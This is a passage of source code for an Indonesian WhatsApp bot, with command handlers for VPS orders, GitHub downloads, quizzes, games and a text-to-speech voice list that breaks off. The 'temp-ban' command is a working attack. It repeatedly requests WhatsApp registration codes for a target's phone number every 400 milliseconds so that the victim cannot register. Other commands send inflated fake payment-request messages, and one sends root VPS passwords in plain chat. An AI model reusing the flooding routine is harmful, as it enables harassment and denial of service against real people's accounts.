      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await KhaerulZx.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case 'svps': case 'sendvps': {
if (banned.includes(m.sender)) {
    return;
    }
		 if (!isCreator) return (`Ngapain Pea`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,ip,ram,harga,passwordvps`)
            reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
KhaerulZx.sendMessage(mq1, {text:`*───❖》Kyy Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m4}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal2}*\n*Jam : ${time}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Ip : ${m2}*\n*[+] Username : root*\n*[+] Password : ${m5}*\n*[+] Ram : ${m3}*\n\n*───《TOS VPS》───*\n\n*-JANGAN SAMPAI TERKENA DDOS*\n*-JANGAN GUNAKAN UNTUK DDOS*\n*-JANGAN GUNAKAN UNTUK MINING*\n*-CPU JANGAN SAMPAI 100%*\n*-MELANGGAR RULES? GARANSI ANGUS*\n*-PANEL SUS NO REFF*`}, m) 
                 }
            break   
case 'git': case 'gitclone':
if (banned.includes(m.sender)) {
    return;
    }
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!args[0]) return m.reply(`Link Nya Mana Kak?\nContoh :\n${prefix}${command} Link Github`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    KhaerulZx.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) =>(mess.error))
break
//=================================================//
            case 'kuismath':
            case 'math': {
            if (banned.includes(m.sender)) {
    return;
    }
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                let {
                    genMath,
                    modes
                } = require('./database/math')
                if (!text) return reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                KhaerulZx.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break

//=================================================//
case 'ttc': case 'ttt': case 'tictactoe': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
 let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = from
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await KhaerulZx.sendText(room.x, str, m, { mentions: parseMention(str) } )
await KhaerulZx.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: from,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
//=================================================//
case 'delttc': case 'delttt': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
 let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
delete this.game[roomnya.id]
m.reply(`Berhasil delete session room tictactoe !`)
}
break
//=================================================//
case 'suitpvp': case 'suit': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await KhaerulZx.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) KhaerulZx.sendText(from, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
//=================================================
case 'testi1': {
if (banned.includes(m.sender)) {
    return;
    }
teks28 = `*TESTI 1*

INI TESTIMONI KYY YANG KE1
KAK ${pushname}

JANGAN RAGU ORDER DI Finsii`
KhaerulZx.sendMessage(from, { image: { url: "https://telegra.ph/file/5c2a375ab0e309fe0cb21.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'testi2': {
if (banned.includes(m.sender)) {
    return;
    }
teks28 = `*TESTI 2*

INI TESTIMONI KYY YANG KE2
KAK ${pushname}

JANGAN RAGU ORDER DI Finsii`
KhaerulZx.sendMessage(from, { image: { url: "https://telegra.ph/file/515915f661c22632e1065.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'testi3': {
if (banned.includes(m.sender)) {
    return;
    }
teks28 = `*TESTI 3*

INI TESTIMONI KYY YANG KE3
KAK ${pushname}

JANGAN RAGU ORDER Finsii`
KhaerulZx.sendMessage(from, { image: { url: "https://telegra.ph/file/ce7f7bf6bf72a2c9049f9.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'testi4': {
if (banned.includes(m.sender)) {
    return;
    }
teks28 = `*TESTI 4*

INI TESTIMONI KYY YANG KE4
KAK ${pushname}

JANGAN RAGU ORDER Finsii`
KhaerulZx.sendMessage(from, { image: { url: "https://telegra.ph/file/5c2a375ab0e309fe0cb21.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'testi5': {
if (banned.includes(m.sender)) {
    return;
    }
teks28 = `*TESTI 5*

INI TESTIMONI KYY YANG KE5
KAK ${pushname}

JANGAN RAGU ORDER Finsii`
KhaerulZx.sendMessage(from, { image: { url: "https://telegra.ph/file/9d3a1716adf6e71b2cc0b.jpg" }, caption: teks28 }, { quoted: fcall })
}
break

case "setppbot": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply(mess.owner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await KhaerulZx.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await KhaerulZx.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Sukses`)
} else {
var memeg = await KhaerulZx.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Sukses`)
}
}
        break
//=================================
/*case 'smeme':
case 'stickermeme':
case 'stickmeme': {
    if (banned.includes(m.sender)) {
        return;
    }

    let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`;
    if (!isPrem && global.db.data.users[sender].limit < 1) 
        return reply('Maaf Kak Limit Anda Habis. Ingin Membeli Limit Ketik .buylimit');
    
    db.data.users[sender].limit -= 1; // -1 limit

    if (!/image/.test(mime)) throw respond;
    if (!text) throw respond;

    reply(`Proses Tuan...`);
    
    let atas = text.split('|')[0] ? text.split('|')[0] : '-';
    let bawah = text.split('|')[1] ? text.split('|')[1] : '-';

    try {
        let mee = await KhaerulZx.downloadAndSaveMediaMessage(quoted);
        let mem = await uploadImage(mee); // Menggunakan fungsi uploadImage
        
        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`;
        let awikwok = await KhaerulZx.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author });
        await fs.unlinkSync(awikwok);
    } catch (e) {
        reply(`Sedang Maintenance Tuan`);
    }
}
break;*/
/*case 'smeme': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!text) {
        reply(`Balas Image Dengan Caption ${prefix + command}`);
        return;
    }
    if (/image/.test(mime)) {
        if (!quoted) {
            reply('Balas pesan yang mengandung gambar!');
            return;
        }
        
        try {
            let mee = await KhaerulZx.downloadAndSaveMediaMessage(quoted);
            let mem = await uploadToCatbox(mee);
            let kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`);
            await KhaerulZx.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author });
        } catch (error) {
            console.error(error);
            reply('Terjadi kesalahan saat memproses meme.');
        }
    } else {
        reply('Balas pesan yang berisi gambar dengan format yang benar!');
    }
    break;
}*/
      case 'apakah': 
      if (banned.includes(m.sender)) {
    return;
    }

if (!text) return reply('Maaf, command ini hanya untuk pemilik.')
 if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya ganteng`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
KhaerulZx.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:m })
        break
case 'tunda':
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return mess.owner
text_trxpending = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 」

𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥`
await KhaerulZx.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxpending,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'proses':
if (banned.includes(m.sender)) {
    return;
    }
text_proses = `「 𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗣𝗥𝗢𝗦𝗘𝗦 」

𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗯𝗲𝗻𝘁𝗮𝗿
𝗣𝗿𝗼𝗱𝘂𝗸 𝗦𝗲𝗱𝗮𝗻𝗴 𝗗𝗶 𝗣𝗿𝗼𝘀𝗲𝘀️`
await KhaerulZx.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_proses,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'batal':
if (banned.includes(m.sender)) {
    return;
    }
text_trxbatal = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal2}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${time}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹`
await KhaerulZx.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxbatal,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'donee': case 'don': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(`Njirr Lu siapa Cuk`)
let s = text.split(',')
let barang = s[0]
let nominal = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal`)
if (!barang) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} vipies,60000`)
if (!nominal) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} panel,1000`)
text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

📦 Barang : ${barang}
💸 Nominal : ${nominal}
📆 Tanggal : ${tanggal2}
🕰️ Waktu : ${time}
✨ Status : Berhasil

ᴛᴇʀɪᴍᴀᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴏʀᴅᴇʀ ᴅɪ ꜰɪɴꜱɪɪ
ᴅɪ ᴛᴜɴɢɢᴜ ᴏʀᴅᴇʀᴀɴ sᴇʟᴀɴᴊᴜᴛɴʏᴀ ☺️`
await KhaerulZx.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: `${nominal}*100000`,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
/*case 'ttsearch': {
if (banned.includes(m.sender)) {
    return;
    }
      if (!text) throw `🚩Example: ${prefix+command} Pencarian`
      if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
                     let res = await fetch(`https://widipe.com/tiktoksearch?text=${text}`)
    let spas = "              "
    let data = await res.json()
    let json = data.result
	let cap = `${spas}*「 T I K T O K S E A R C H 」*

*📛Author:* ${json.title}

${global.footer2}`
KhaerulZx.sendMessage(m.chat, { video: { url: json.no_watermark }, caption: cap }, { quoted: m})
const KhaerulZxtikmp3 = {url:data.audio}
KhaerulZx.sendMessage(m.chat, { audio: KhaerulZxtikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
} 
                break */
case 'temp-ban': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(`Khusus Finsii`)
if (!text) return m?.reply(`example ${command} 62|87872627288`)
if (!/|/.test(text)) return m?.reply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|87872627288`)
let numbers = JSON.parse(fs.readFileSync('./database/tb.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await m?.reply(`👤 Sukses! Gangguan Registrasi telah berhasil dikirim ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down 🩸.`)

let { state, saveCreds } = await useMultiFileAuthState('tb')

let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./database/tb.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break 
case 'text2speech': {
            function ListVoiceArray(array) {
    const modifiedArray = array.map(item => {
        const modifiedName = item.replace(/(.+)-(.+)-(.+)Neural/, "$3 ($1-$2)");
        const language = item.split('-')[0];
        return `${modifiedName} ( ${language} )`;
    });

    return modifiedArray;
}

    let ListVoice = [
        "af-ZA-AdriNeural",
        "af-ZA-WillemNeural",
        "am-ET-AmehaNeural",
        "am-ET-MekdesNeural",
        "ar-AE-FatimaNeural",
        "ar-AE-HamdanNeural",
        "ar-BH-AliNeural",
        "ar-BH-LailaNeural",
        "ar-DZ-AminaNeural",
        "ar-DZ-IsmaelNeural",
        "ar-EG-SalmaNeural",
        "ar-EG-ShakirNeural",
        "ar-IQ-BasselNeural",
        "ar-IQ-RanaNeural",
        "ar-JO-SanaNeural",
        "ar-JO-TaimNeural",
        "ar-KW-FahedNeural",
        "ar-KW-NouraNeural",
        "ar-LB-LaylaNeural",
        "ar-LB-RamiNeural",
        "ar-LY-ImanNeural",
        "ar-LY-OmarNeural",
        "ar-MA-JamalNeural",
        "ar-MA-MounaNeural",
        "ar-OM-AbdullahNeural",
        "ar-OM-AyshaNeural",
        "ar-QA-AmalNeural",
        "ar-QA-MoazNeural",
        "ar-SA-HamedNeural",
        "ar-SA-ZariyahNeural",
        "ar-SY-AmanyNeural",
        "ar-SY-LaithNeural",
        "ar-TN-HediNeural",
        "ar-TN-ReemNeural",
        "ar-YE-MaryamNeural",
        "ar-YE-SalehNeural",
        "az-AZ-BabekNeural",
        "az-AZ-BanuNeural",
        "bg-BG-BorislavNeural",
        "bg-BG-KalinaNeural",
        "bn-BD-NabanitaNeural",
        "bn-BD-PradeepNeural",
        "bn-IN-BashkarNeural",
        "bn-IN-TanishaaNeural",
        "bs-BA-GoranNeural",
        "bs-BA-VesnaNeural",
        "ca-ES-AlbaNeural",
        "ca-ES-EnricNeural",
        "ca-ES-JoanaNeural",
        "cs-CZ-AntoninNeural",
        "cs-CZ-VlastaNeural",
        "cy-GB-AledNeural",
        "cy-GB-NiaNeural",
        "da-DK-ChristelNeural",
        "da-DK-JeppeNeural",
        "de-AT-IngridNeural",
        "de-AT-JonasNeural",
        "de-CH-JanNeural",
        "de-CH-LeniNeural",
        "de-DE-AmalaNeural",
        "de-DE-BerndNeural",
        "de-DE-ChristophNeural",
        "de-DE-ConradNeural",
        "de-DE-ElkeNeural",
        "de-DE-GiselaNeural",
        "de-DE-KasperNeural",
        "de-DE-KatjaNeural",
        "de-DE-KillianNeural",
        "de-DE-KlarissaNeural",
        "de-DE-KlausNeural",
        "de-DE-LouisaNeural",
        "de-DE-MajaNeural",
        "de-DE-RalfNeural",
        "de-DE-TanjaNeural",
        "el-GR-AthinaNeural",
        "el-GR-NestorasNeural",
        "en-AU-AnnetteNeural",
        "en-AU-CarlyNeural",
        "en-AU-DarrenNeural",
        "en-AU-DuncanNeural",
        "en-AU-ElsieNeural",
        "en-AU-FreyaNeural",
        "en-AU-JoanneNeural",
        "en-AU-KenNeural",
        "en-AU-KimNeural",
        "en-AU-NatashaNeural",
        "en-AU-NeilNeural",
        "en-AU-TimNeural",
        "en-AU-TinaNeural",
        "en-AU-WilliamNeural",
        "en-CA-ClaraNeural",
        "en-CA-LiamNeural",
        "en-GB-AbbiNeural",
        "en-GB-AlfieNeural",
        "en-GB-BellaNeural",
        "en-GB-ElliotNeural",
        "en-GB-EthanNeural",
        "en-GB-HollieNeural",
        "en-GB-LibbyNeural",
        "en-GB-MaisieNeural",
        "en-GB-MiaNeural",
        "en-GB-NoahNeural",
        "en-GB-OliverNeural",
        "en-GB-OliviaNeural",
        "en-GB-RyanNeural",
        "en-GB-SoniaNeural",
        "en-GB-ThomasNeural",
        "en-HK-SamNeural",
        "en-HK-YanNeural",
        "en-IE-ConnorNeural",
        "en-IE-EmilyNeural",
        "en-IN-NeerjaNeural",
        "en-IN-PrabhatNeural",
        "en-KE-AsiliaNeural",
        "en-KE-ChilembaNeural",
        "en-NG-AbeoNeural",
        "en-NG-EzinneNeural",
        "en-NZ-MitchellNeural",
        "en-NZ-MollyNeural",
        "en-PH-JamesNeural",
        "en-PH-RosaNeural",
        "en-SG-LunaNeural",
        "en-SG-WayneNeural",
        "en-TZ-ElimuNeural",
        "en-TZ-ImaniNeural",
        "en-US-AIGenerate1Neural",
        "en-US-AIGenerate2Neural",
        "en-US-AmberNeural",
        "en-US-AnaNeural",
        "en-US-AriaNeural",
        "en-US-AshleyNeural",
        "en-US-BlueNeural",
        "en-US-BrandonNeural",
        "en-US-ChristopherNeural",
        "en-US-CoraNeural",
        "en-US-DavisNeural",
        "en-US-ElizabethNeural",
        "en-US-EricNeural",
        "en-US-GuyNeural",
        "en-US-JacobNeural",
        "en-US-JaneNeural",
        "en-US-JasonNeural",
        "en-US-JennyMultilingualNeural",
        "en-US-JennyMultilingualV2Neural",
        "en-US-JennyNeural",
        "en-US-MichelleNeural",
        "en-US-MonicaNeural",
        "en-US-NancyNeural",
        "en-US-RogerNeural",
        "en-US-RyanMultilingualNeural",
        "en-US-SaraNeural",
        "en-US-SteffanNeural",
        "en-US-TonyNeural",
        "en-ZA-LeahNeural",
        "en-ZA-LukeNeural",
        "es-AR-ElenaNeural",
        "es-AR-TomasNeural",
        "es-BO-MarceloNeural",
        "es-BO-SofiaNeural",
        "es-CL-CatalinaNeural",
        "es-CL-LorenzoNeural",
        "es-CO-GonzaloNeural",
        "es-CO-SalomeNeural",
        "es-CR-JuanNeural",
        "es-CR-MariaNeural",
        "es-CU-BelkysNeural",
        "es-CU-ManuelNeural",
        "es-DO-EmilioNeural",
        "es-DO-RamonaNeural",
        "es-EC-AndreaNeural",
        "es-EC-LuisNeural",
        "es-ES-AbrilNeural",
        "es-ES-AlvaroNeural",
        "es-ES-ArnauNeural",
        "es-ES-DarioNeural",
        "es-ES-EliasNeural",
        "es-ES-ElviraNeural",
        "es-ES-EstrellaNeural",
        "es-ES-IreneNeural",
        "es-ES-LaiaNeural",
        "es-ES-LiaNeural",
        "es-ES-NilNeural",
        "es-ES-SaulNeural",
        "es-ES-TeoNeural",
        "es-ES-TrianaNeural",
        "es-ES-VeraNeural",
        "es-GQ-JavierNeural",
        "es-GQ-TeresaNeural",
        "es-GT-AndresNeural",
        "es-GT-MartaNeural",
        "es-HN-CarlosNeural",
        "es-HN-KarlaNeural",
        "es-MX-BeatrizNeural",
        "es-MX-CandelaNeural",
        "es-MX-CarlotaNeural",
        "es-MX-CecilioNeural",
        "es-MX-DaliaNeural",
        "es-MX-GerardoNeural",
        "es-MX-JorgeNeural",
        "es-MX-LarissaNeural",
        "es-MX-LibertoNeural",
        "es-MX-LucianoNeural",
        "es-MX-MarinaNeural",
        "es-MX-NuriaNeural",
        "es-MX-PelayoNeural",
        "es-MX-RenataNeural",
        "es-MX-YagoNeural",
        "es-NI-FedericoNeural",
        "es-NI-YolandaNeural",
        "es-PA-MargaritaNeural",
        "es-PA-RobertoNeural",
        "es-PE-AlexNeural",
        "es-PE-CamilaNeural",
        "es-PR-KarinaNeural",
        "es-PR-VictorNeural",
        "es-PY-MarioNeural",
        "es-PY-TaniaNeural",
        "es-SV-LorenaNeural",
        "es-SV-RodrigoNeural",
        "es-US-AlonsoNeural",
        "es-US-PalomaNeural",
        "es-UY-MateoNeural",
        "es-UY-ValentinaNeural",
        "es-VE-PaolaNeural",
        "es-VE-SebastianNeural",
        "et-EE-AnuNeural",
        "et-EE-KertNeural",
        "eu-ES-AinhoaNeural",
        "eu-ES-AnderNeural",
        "fa-IR-DilaraNeural",
        "fa-IR-FaridNeural",
        "fi-FI-HarriNeural",
        "fi-FI-NooraNeural",
        "fi-FI-SelmaNeural",
        "fil-PH-AngeloNeural",
        "fil-PH-BlessicaNeural",
        "fr-BE-CharlineNeural",
        "fr-BE-GerardNeural",
        "fr-CA-AntoineNeural",
        "fr-CA-JeanNeural",
        "fr-CA-SylvieNeural",
        "fr-CH-ArianeNeural",
        "fr-CH-FabriceNeural",
        "fr-FR-AlainNeural",
        "fr-FR-BrigitteNeural",
        "fr-FR-CelesteNeural",
        "fr-FR-ClaudeNeural",
        "fr-FR-CoralieNeural",
        "fr-FR-DeniseNeural",
        "fr-FR-EloiseNeural",
        "fr-FR-HenriNeural",
        "fr-FR-JacquelineNeural",
        "fr-FR-JeromeNeural",
        "fr-FR-JosephineNeural",
        "fr-FR-MauriceNeural",
        "fr-FR-YvesNeural",
        "fr-FR-YvetteNeural",
        "ga-IE-ColmNeural",
        "ga-IE-OrlaNeural",
        "gl-ES-RoiNeural",
        "gl-ES-SabelaNeural",
        "gu-IN-DhwaniNeural",
        "gu-IN-NiranjanNeural",
        "he-IL-AvriNeural",
        "he-IL-HilaNeural",
        "hi-IN-MadhurNeural",
        "hi-IN-SwaraNeural",
        "hr-HR-GabrijelaNeural",
        "hr-HR-SreckoNeural",
        "hu-HU-NoemiNeural",
        "hu-HU-TamasNeural",
        "hy-AM-AnahitNeural",
        "hy-AM-HaykNeural",
        "id-ID-ArdiNeural",
        "id-ID-GadisNeural",
        "is-IS-GudrunNeural",
        "is-IS-GunnarNeural",
        "it-IT-BenignoNeural",
        "it-IT-CalimeroNeural",
        "it-IT-CataldoNeural",
        "it-IT-DiegoNeural",
        "it-IT-ElsaNeural",
        "it-IT-FabiolaNeural",
        "it-IT-FiammaNeural",
        "it-IT-GianniNeural",
        "it-IT-ImeldaNeural",
        "it-IT-IrmaNeural",
        "it-IT-IsabellaNeural",
        "it-IT-LisandroNeural",
        "it-IT-PalmiraNeural",
        "it-IT-PierinaNeural",
        "it-IT-RinaldoNeural",
        "ja-JP-AoiNeural",
        "ja-JP-DaichiNeural",
        "ja-JP-KeitaNeural",
        "ja-JP-MayuNeural",
        "ja-JP-NanamiNeural",
        "ja-JP-NaokiNeural",
        "ja-JP-ShioriNeural",
        "jv-ID-DimasNeural",
        "jv-ID-SitiNeural",
        "ka-GE-EkaNeural",
        "ka-GE-GiorgiNeural",
        "kk-KZ-AigulNeural",
        "kk-KZ-DauletNeural",
        "km-KH-PisethNeural",
        "km-KH-SreymomNeural",
        "kn-IN-GaganNeural",
        "kn-IN-SapnaNeural",
        "ko-KR-BongJinNeural",
        "ko-KR-GookMinNeural",
        "ko-KR-InJoonNeural",
        "ko-KR-JiMinNeural",
        "ko-KR-SeoHyeonNeural",
        "ko-KR-SoonBokNeural",
        "ko-KR-SunHiNeural",
        "ko-KR-YuJinNeural",
        "lo-LA-ChanthavongNeural",
        "lo-LA-KeomanyNeural",
        "lt-LT-LeonasNeural",
        "lt-LT-OnaNeural",
        "lv-LV-EveritaNeural",
        "lv-LV-NilsNeural",
        "mk-MK-AleksandarNeural",
        "mk-MK-MarijaNeural",
        "ml-IN-MidhunNeural",
        "ml-IN-SobhanaNeural",
        "mn-MN-BataaNeural",
        "mn-MN-YesuiNeural",
        "mr-IN-AarohiNeural",
        "mr-IN-ManoharNeural",
        "ms-MY-OsmanNeural",
        "ms-MY-YasminNeural",
        "mt-MT-GraceNeural",
